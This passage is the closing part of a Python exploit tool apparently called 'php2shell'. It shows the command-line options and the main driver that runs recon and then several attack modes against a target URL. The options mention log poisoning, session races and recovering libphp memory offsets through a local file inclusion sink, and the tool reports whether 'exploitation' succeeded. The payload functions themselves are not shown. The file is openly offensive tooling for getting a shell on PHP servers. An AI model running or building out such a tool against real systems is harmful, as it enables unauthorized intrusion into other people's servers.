                   help="comma-separated methods to skip, e.g. session_race,log_poison")
    p.add_argument("--offsets-via-lfi", dest="offsets_via_lfi",
                   action="store_true", default=False,
                   help="recover libphp offsets through the LFI sink")
    p.add_argument("--proxy")
    p.add_argument("--timeout", type=int, default=15)
    p.add_argument("-k", "--insecure", action="store_true")
    p.add_argument("-o", "--output")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--strict", action="store_true", help="exit non-zero on error")
    p.add_argument("--self-test", action="store_true")
    args = p.parse_args()

    print("php2shell v%s  target=%s  mode=%s" % (VERSION, args.url, args.mode))
    s = session(args.proxy, args.timeout, not args.insecure)
    res = Result(args.url)

    try:
        if args.dry_run:
            res.add("dry_run", "info", "no packets sent")
            return 0
        if args.self_test:
            self_test(args)
            return 0

        info = recon(args.url, s, res)
        if args.mode == "recon":
            res.summary()
            return 0

        if args.mode == "a":
            ok = category_a(args.url, s, res, info, args)
        elif args.mode == "b":
            seed = args.seed_url or urllib.parse.urljoin(args.url, "/seed/")
            fire = args.fire_url or urllib.parse.urljoin(args.url, "/fire/")
            ok = category_b(seed, fire, s, res, args)
        elif args.mode == "c":
            ok = category_c(args.url, s, res, args)
            if args.offsets_via_lfi:
                par, _wrapper = probe_lfi(args.url, LFI_PARAMS, s)
                if par:
                    offsets_via_lfi(args.url, par, s, res)
                else:
                    res.add("offsets_no_sink", "info",
                            "no include sink on this endpoint for offset recovery")
        else:
            ok = orchestrate(args.url, s, res, info, args)

        res.summary()
        if args.output:
            res.save(args.output)
        print("\nRESULT: %s" % ("SUCCESS" if ok else "no exploitation achieved"))
        return 0
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        return 130
    except Exception as e:
        import traceback
        print("\n[!] aborted: %s" % e)
        if args.strict:
            traceback.print_exc()
            return 2
        return 0
    finally:
        if args.output and res.findings:
            try:
                res.save(args.output)
            except Exception:
                pass


if __name__ == "__main__":
    sys.exit(main())
